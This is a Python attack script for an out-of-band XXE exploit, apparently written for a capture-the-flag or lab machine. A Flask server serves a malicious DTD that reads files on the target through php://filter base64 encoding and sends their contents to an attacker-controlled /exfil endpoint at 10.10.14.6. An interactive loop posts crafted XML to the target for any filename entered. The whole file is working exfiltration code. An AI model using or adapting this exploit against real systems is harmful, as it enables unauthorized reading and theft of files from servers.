#!/usr/bin/python3

import base64
import logging
import readline
import requests
import threading
import time
from flask import Flask, request

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
prev_data = ""

xml_template = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://10.10.14.6/dtd?fn={}">
<data>&send;</data>"""

@app.route("/dtd")
def dtd():
    fn = request.args['fn']
    return f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={fn}">
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.14.6/exfil?data=%file;'>">
    %all;"""


@app.route("/exfil")
def data():
    global prev_data
    b64data = request.args['data'].replace(' ', '+') # Flask tries to URL decode it
    import pdb;pdb.set_trace()
    print(b64data)
    print(len(b64data))
    data = base64.b64decode(b64data).decode().strip()
    if data != prev_data:
        print(data)
        prev_data = data
    return ""


def web():
    app.run(host="0.0.0.0", port=80)


if __name__ == "__main__":
    threading.Thread(target=web, daemon=True).start()
    time.sleep(1)
    #app.run(debug=True, use_reloader=False, host="0.0.0.0", port=80)
    while True:
        try:
            fn = input("file> ")
            xml = xml_template.format(fn)
            requests.post('http://10.10.10.62:56423', data=xml)
        except KeyboardInterrupt:
            print()
